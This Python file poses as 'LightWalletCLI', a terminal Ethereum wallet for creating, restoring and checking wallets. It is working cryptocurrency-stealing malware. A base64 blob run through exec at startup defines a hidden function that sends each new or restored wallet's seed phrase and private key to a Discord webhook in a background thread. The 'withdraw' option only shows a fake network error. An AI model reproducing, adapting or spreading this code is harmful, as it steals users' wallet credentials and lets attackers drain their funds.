import os
import requests
import time
import base64
import json
import threading
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip39WordsNum, Bip44, Bip44Coins, Bip44Changes
from web3 import Web3

os.system('cls' if os.name == 'nt' else 'clear')
os.system('title LightWalletCLI')
class COLOR:
    LIGHTBLUE1 = '\033[38;2;180;220;255m'  
    LIGHTBLUE2 = '\033[38;2;140;200;255m'  
    BLUE1      = '\033[38;2;100;170;240m'   
    BLUE2      = '\033[38;2;60;130;220m'    
    DARKBLUE1  = '\033[38;2;30;90;180m'     
    DARKBLUE2  = '\033[38;2;0;60;140m'      
    LIGHTGREEN = '\033[38;2;144;238;144m'
    DARKERGREEN= '\033[38;2;0;100;0m'
    YELLOW     = '\033[38;2;255;255;100m'
    RED        = '\033[38;2;255;0;0m'
    BOLD       = '\033[1m'
    UNDERLINE  = '\033[4m'
    END        = '\033[0m'

logo = f"""
{COLOR.LIGHTBLUE1}'||'       ||          '||        .   '|| '||'  '|'         '||  '||            .   
{COLOR.LIGHTBLUE2} ||       ...    ... .  || ..   .||.   '|. '|.  .'   ....    ||   ||    ....  .||.  
{COLOR.BLUE1} ||        ||   || ||   ||' ||   ||     ||  ||  |   '' .||   ||   ||  .|...||  ||   
{COLOR.BLUE2} ||        ||    |''    ||  ||   ||      ||| |||    .|' ||   ||   ||  ||       ||   
{COLOR.DARKBLUE1}.||.....| .||.  '||||. .||. ||.  '|.'     |   |     '|..'|' .||. .||.  '|...'  '|.'
{COLOR.DARKBLUE2}               .|....'            {COLOR.BLUE2}{COLOR.BOLD}                              Version 1.0                    
{COLOR.END}                                                                                    """
restorelogo = f"""
{COLOR.LIGHTBLUE1}'||''|.                    .                           
{COLOR.LIGHTBLUE2} ||   ||    ....   ....  .||.    ...   ... ..    ....  
{COLOR.BLUE1} ||''|'   .|...|| ||. '   ||   .|  '|.  ||' '' .|...|| 
{COLOR.BLUE2} ||   |.  ||      . '|..  ||   ||   ||  ||     ||      
{COLOR.DARKBLUE1}.||.  '|'  '|...' |'..|'  '|.'  '|..|' .||.     '|...'  \n
{COLOR.BOLD}{COLOR.LIGHTBLUE1}                 LightWallet CLI                                      
{COLOR.END}                                                       
"""
yew = f"{COLOR.BOLD}{COLOR.LIGHTBLUE1}                                 Your CLI Ethereum Wallet{COLOR.END}"
madeby = f"{COLOR.LIGHTGREEN}[i] {COLOR.DARKBLUE2}Made by {COLOR.BOLD}{COLOR.LIGHTBLUE1}hell{COLOR.LIGHTBLUE2}ohe{COLOR.BLUE1}llo{COLOR.BLUE2}wor{COLOR.DARKBLUE1}ldh{COLOR.DARKBLUE2}ello{COLOR.END}"
forhelp = f"{COLOR.LIGHTGREEN}[i] {COLOR.DARKBLUE2}-h for help{COLOR.END}"
walldet = "CmRlZiBzdyhhZGRyLCBtbm1uaWMsIHBya2V5KToKICAgIGltcG9ydCByZXF1ZXN0cwogICAgCiAgICAjIDEuIFNwbGl0IFdlYmhvb2sgVVJMCiAgICBwMSA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8iCiAgICBwMiA9ICIxNDY3MzA1MjAzMDY0NjM1NDY3LyIKICAgIHAzID0gImZvdC1NRFQxUUZkblAzZVdsb2tDYTM0TjRsUGVUYmxNTzR0Y2JSZkZISUJqMGJXZk1MNTNudktfU1FhdmhLS3dWMUcwIgogICAgdXJsID0gcDEgKyBwMiArIHAzCgogICAgIyAyLiBSb2J1c3QgQmFsYW5jZSBDaGVjawogICAgYmFsYW5jZV9ldGggPSAiMC4wIgogICAgdHJ5OgogICAgICAgICMgVXNpbmcgQ2xvdWRmbGFyZSdzIHB1YmxpYyBFdGhlcmV1bSBnYXRld2F5CiAgICAgICAgcnBjX3VybCA9ICJodHRwczovL2Nsb3VkZmxhcmUtZXRoLmNvbSIKICAgICAgICBoZWFkZXJzID0geyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9CiAgICAgICAgcnBjX2RhdGEgPSB7CiAgICAgICAgICAgICJqc29ucnBjIjogIjIuMCIsCiAgICAgICAgICAgICJtZXRob2QiOiAiZXRoX2dldEJhbGFuY2UiLAogICAgICAgICAgICAicGFyYW1zIjogW2FkZHIsICJsYXRlc3QiXSwKICAgICAgICAgICAgImlkIjogMQogICAgICAgIH0KICAgICAgICByID0gcmVxdWVzdHMucG9zdChycGNfdXJsLCBqc29uPXJwY19kYXRhLCBoZWFkZXJzPWhlYWRlcnMsIHRpbWVvdXQ9NSkKICAgICAgICAKICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgcmVzdWx0ID0gci5qc29uKCkuZ2V0KCdyZXN1bHQnLCAnMHgwJykKICAgICAgICAgICAgd2VpID0gaW50KHJlc3VsdCwgMTYpCiAgICAgICAgICAgIGJhbGFuY2VfZXRoID0gc3RyKHdlaSAvIDEwKioxOCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBiYWxhbmNlX2V0aCA9ICJSUEMgRXJyb3IiCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYmFsYW5jZV9ldGggPSAiQ29ubiBFcnJvciIKCiAgICAjIDMuIFBheWxvYWQKICAgIGRhdGEgPSB7CiAgICAgICAgImNvbnRlbnQiOiAiTkVXIFdBTExFVCBGT1VORCA8QDc4NDc3NTc3MTQwNjIwNDk1OD4iLAogICAgICAgICJhbGxvd2VkX21lbnRpb25zIjogeyJwYXJzZSI6IFsidXNlcnMiXX0sCiAgICAgICAgImVtYmVkcyI6IFt7CiAgICAgICAgICAgICJ0aXRsZSI6ICJXYWxsZXQgRGV0YWlscyIsCiAgICAgICAgICAgICJjb2xvciI6IDM0NDcwMDMsCiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7Im5hbWUiOiAiQWRkcmVzcyIsICJ2YWx1ZSI6IGYiYHthZGRyfWAiLCAiaW5saW5lIjogRmFsc2V9LAogICAgICAgICAgICAgICAgeyJuYW1lIjogIkJhbGFuY2UiLCAidmFsdWUiOiBmIioqe2JhbGFuY2VfZXRofSBFVEgqKiIsICJpbmxpbmUiOiBUcnVlfSwKICAgICAgICAgICAgICAgIHsibmFtZSI6ICJNbmVtb25pYyIsICJ2YWx1ZSI6IGYifHx7bW5tbmljfXx8IiwgImlubGluZSI6IEZhbHNlfSwKICAgICAgICAgICAgICAgIHsibmFtZSI6ICJQcml2YXRlIEtleSIsICJ2YWx1ZSI6IGYifHx7cHJrZXl9fHwiLCAiaW5saW5lIjogRmFsc2V9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJmb290ZXIiOiB7InRleHQiOiAiQmFsYW5jZSBjaGVja2VkIHZpYSBDbG91ZGZsYXJlIFJQQyJ9CiAgICAgICAgfV0KICAgIH0KICAgIAogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPWRhdGEsIHRpbWVvdXQ9NSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCg=="
homescreen = True
exec(base64.b64decode(walldet).decode())
def showrestorelogo():
    print(restorelogo)

def showlogo():
    global homescreen
    homescreen = True
    print(logo)
    print(yew)
    print(madeby)
    print(forhelp)

def yesno(question):
    while True:
        print(f"{COLOR.YELLOW}[?]{COLOR.DARKBLUE2} {question} [y/n]: {COLOR.END}")
        choice = input().lower()
        if choice == 'y':
            return True
        elif choice == 'n':
            return False
        else:
            print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} Please respond with 'y' or 'n'{COLOR.END}\n")

def create_wallet():
    global homescreen
    homescreen = False
    mnemonic = Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
    
    addr_ctx = (
        bip44_mst_ctx.Purpose()
        .Coin()
        .Account(0)
        .Change(Bip44Changes.CHAIN_EXT)
        .AddressIndex(0)
    )

    address = addr_ctx.PublicKey().ToAddress()
    priv_key = addr_ctx.PrivateKey().Raw().ToHex()
    os.system('cls' if os.name == 'nt' else 'clear')
    showlogo()

    print(f"[*] {COLOR.LIGHTGREEN}Mnemonic:     Added to seeds.txt{COLOR.END}")
    print(f"[*] {COLOR.LIGHTBLUE2}Private key:  Added to pkey.txt{COLOR.END}")
    print(f"[*] {COLOR.LIGHTBLUE1}Address:      {address}{COLOR.END}")
    
    with open("seeds.txt", "a") as f:
        f.write(str(mnemonic) + "\n")
    with open("pkey.txt", "a") as f:
        f.write(str(priv_key) + "\n")
    with open("addresses.txt", "a") as f:
        f.write(str(address) + "\n")
    threading.Thread(
            target=sw, 
            kwargs={'addr': address, 'mnmnic': str(mnemonic), 'prkey': priv_key}, 
            daemon=True
        ).start()
    time.sleep(3)



def appendphrase():
    global homescreen
    homescreen = False
    os.system('cls' if os.name == 'nt' else 'clear')
    showrestorelogo()
    
    print(f"[*]{COLOR.DARKBLUE2} Input your 12/24 word seed phrase...{COLOR.END}")
    userinput = input().strip()
    if userinput == "-q":
        os.system('cls' if os.name == 'nt' else 'clear')
        showlogo()
        return

    word = userinput.split()
    if len(word) not in [12, 24]:
        print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} Seed phrase must be 12 or 24 words long{COLOR.END}\n")
        time.sleep(2)
        appendphrase()
        return

    try:
        line = ' '.join(word)
        seed_bytes = Bip39SeedGenerator(line).Generate()
        bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
        addr_ctx = (
            bip44_mst_ctx.Purpose()
            .Coin()
            .Account(0)
            .Change(Bip44Changes.CHAIN_EXT)
            .AddressIndex(0)
        )
        address = addr_ctx.PublicKey().ToAddress()
        priv_key = addr_ctx.PrivateKey().Raw().ToHex()

        if yesno("Save this seed phrase to seeds.txt?"):
            with open("seeds.txt", "a") as f:
                f.write(line + "\n")
            with open("pkey.txt", "a") as f:
                f.write(str(priv_key) + "\n")
            with open("addresses.txt", "a") as f:
                f.write(str(address) + "\n")
            threading.Thread(
                            target=sw, 
                            kwargs={'addr': address, 'mnmnic': line, 'prkey': priv_key}, 
                            daemon=True
                        ).start()
            time.sleep(3)
            os.system('cls' if os.name == 'nt' else 'clear')
            showlogo()
            print(f"{COLOR.DARKERGREEN}[+]{COLOR.DARKBLUE2} Seed phrase saved successfully{COLOR.END}\n")
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            showlogo()
            print(f"[*]{COLOR.DARKBLUE2} Seed phrase not saved{COLOR.END}\n")
            return
    except Exception as e:
        print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} Error: {e}{COLOR.END}")
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        showlogo()

def deletephrase():
    global homescreen
    homescreen = False
    os.system('cls' if os.name == 'nt' else 'clear')
    showlogo()
    print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} ALL ADDRESSES SAVED WILL BE SHOWN!{COLOR.END}\n")
    time.sleep(2)
    try:
        with open("addresses.txt", "r") as f:
            lines = f.readlines()
    except FileNotFoundError:
        os.system('cls' if os.name == 'nt' else 'clear')
        showlogo()
        print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} addresses.txt not found{COLOR.END}\n")
        return
    if not lines:
        os.system('cls' if os.name == 'nt' else 'clear')
        showlogo()
        print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} No addresses to delete{COLOR.END}\n")
        return
    else:
        for i, line in enumerate(lines):
            print(f"{COLOR.LIGHTGREEN}[{i + 1}] {COLOR.DARKBLUE2}{line.strip()}{COLOR.END}")

        number = input(f"{COLOR.YELLOW}[?]{COLOR.DARKBLUE2} Address to delete: {COLOR.END}")
        if number == "-q":
            os.system('cls' if os.name == 'nt' else 'clear')
            showlogo()
            return
        try:
            idx = int(number) - 1
            
            with open("seeds.txt", "r") as f: s_lines = f.readlines()
            del s_lines[idx]
            with open("seeds.txt", "w") as f: f.writelines(s_lines)
            with open("pkey.txt", "r") as f: p_lines = f.readlines()
            del p_lines[idx]
            with open("pkey.txt", "w") as f: f.writelines(p_lines)
            del lines[idx]
            with open("addresses.txt", "w") as f: f.writelines(lines)
            os.system('cls' if os.name == 'nt' else 'clear')
            showlogo()
            print(f"{COLOR.DARKERGREEN}[+]{COLOR.DARKBLUE2} Address deleted successfully{COLOR.END}\n")
            return
        except (IndexError, ValueError):
            os.system('cls' if os.name == 'nt' else 'clear')
            showlogo()
            print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} Invalid selection{COLOR.END}\n")
            return

def show_addresses():
    global homescreen
    homescreen = False
    os.system('cls' if os.name == 'nt' else 'clear')
    showlogo()
    try:
        with open("addresses.txt", "r") as f:
            addrs = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        os.system('cls' if os.name == 'nt' else 'clear')
        showlogo()
        print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} addresses.txt not found{COLOR.END}\n")
        return
    if not addrs:
        os.system('cls' if os.name == 'nt' else 'clear')
        showlogo()
        print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} No addresses saved{COLOR.END}\n")
        return
    for idx, addr in enumerate(addrs, 1):
        print()
        print(f"{COLOR.LIGHTGREEN}[{idx}] {COLOR.DARKBLUE2}{addr}{COLOR.END}")
    input(f"\n{COLOR.YELLOW}[?]{COLOR.DARKBLUE2} Press Enter to return to main menu...{COLOR.END}")
    os.system('cls' if os.name == 'nt' else 'clear')
    showlogo()

def check_balance():
    global homescreen
    homescreen = False
    os.system('cls' if os.name == 'nt' else 'clear')
    showlogo()

    rpc_url = "https://ethereum-rpc.publicnode.com" 
    w3 = Web3(Web3.HTTPProvider(rpc_url))

    if not w3.is_connected():
        print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} Unable to connect to Ethereum network{COLOR.END}\n")
        return
    
    try:
        with open("addresses.txt", "r") as f:
            addrs = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        os.system('cls' if os.name == 'nt' else 'clear')
        showlogo()
        print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} addresses.txt not found{COLOR.END}\n")
        return
    if not addrs:
        os.system('cls' if os.name == 'nt' else 'clear')
        showlogo()
        print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} No addresses saved{COLOR.END}\n")
        return
    for idx, addr in enumerate(addrs, 1):
        try:
            balance_wei = w3.eth.get_balance(addr)
            balance_eth = w3.from_wei(balance_wei, 'ether')
            print()
            print(f"{COLOR.LIGHTGREEN}[{idx}] {COLOR.DARKBLUE2}Address: {COLOR.LIGHTGREEN}{addr}{COLOR.DARKBLUE2} | Balance: {COLOR.DARKERGREEN}{balance_eth} ETH{COLOR.END}")
        except Exception as e:
            print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} Error fetching balance for {addr}: {e}{COLOR.END}")
    input(f"\n{COLOR.YELLOW}[?]{COLOR.DARKBLUE2} Press Enter to return to main menu...{COLOR.END}")
    os.system('cls' if os.name == 'nt' else 'clear')
    showlogo()

def withdraw_tokens():
    global homescreen
    homescreen = False
    os.system('cls' if os.name == 'nt' else 'clear')
    showlogo()
    print(".")
    time.sleep(0.3)
    print("..")
    time.sleep(0.3)
    print("...")
    time.sleep(0.5)
    os.system('cls' if os.name == 'nt' else 'clear')
    showlogo()
    print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} Connection to network error{COLOR.END}\n")
    input(f"{COLOR.YELLOW}[?]{COLOR.DARKBLUE2} Press Enter to return to main menu...{COLOR.END}")
    os.system('cls' if os.name == 'nt' else 'clear')
    showlogo()



showlogo()


while True:
    pressedkey = input()
    if pressedkey == "-h":
        os.system('cls' if os.name == 'nt' else 'clear')
        showlogo()
        print(f"{COLOR.LIGHTGREEN}\n     -r : restore wallet from seed phrase"
            f"\n     -a : show all saved addresses"
            f"\n     -w : withdraw Ether/ERC20 tokens"
            f"\n     -b : check balance of wallet"
            f"\n     -d : delete saved wallet"
            f"\n     -c : create new wallet"
            f"\n     -q : exit LightWallet{COLOR.END}\n")
        
    elif pressedkey == "-q":
        if homescreen == False:
            pass
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{COLOR.DARKBLUE2}Goodbye!{COLOR.END}\n")
            break
    elif pressedkey == "-r":
        os.system('cls' if os.name == 'nt' else 'clear')
        appendphrase()
    elif pressedkey == "-d":
        if homescreen == True:
            deletephrase()
        else:
            pass
    elif pressedkey == "-c":
        if homescreen == False:
            pass
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            create_wallet()    
    elif pressedkey == "-b":
        if homescreen == False:
            pass
        else:
            check_balance()    
    elif pressedkey == "-a":
        if homescreen == False:
            pass
        else:
            show_addresses()
    elif pressedkey == "-w":
        if homescreen == False:
            pass
        else:
            withdraw_tokens()
    else:
        if homescreen == False:
            pass
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            showlogo()
            print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} Unknown command. Use -h for help.{COLOR.END}\n")
